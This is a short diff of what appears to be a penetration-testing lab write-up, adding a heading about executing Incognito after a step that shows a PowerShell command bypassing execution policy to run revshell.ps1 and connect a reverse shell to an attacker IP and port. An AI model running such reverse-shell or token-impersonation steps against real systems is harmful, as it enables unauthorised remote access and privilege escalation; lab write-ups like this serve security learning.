@@ -163,3 +163,5 @@ Since attaining a reverse shell back to our attacker machine via metasploit to c
     C:\Windows\system32>powershell -ExecutionPolicy Bypass -File .\revshell.ps1 192.168.64.129 444
 ![image](https://github.com/user-attachments/assets/31cc46ba-6c30-4a1e-9643-3b188f03836c)
 ![image](https://github.com/user-attachments/assets/71eba421-2780-496f-be24-c27169cfea24)
+
+#### 2.Executing Incognito
